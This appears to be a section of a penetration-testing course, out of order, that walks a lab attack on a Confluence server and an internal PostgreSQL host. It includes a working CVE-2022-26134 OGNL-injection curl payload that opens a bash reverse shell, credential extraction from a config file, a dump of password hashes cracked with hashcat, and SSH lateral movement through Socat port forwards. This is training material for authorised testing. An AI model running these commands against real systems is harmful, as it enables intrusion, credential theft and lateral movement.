2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
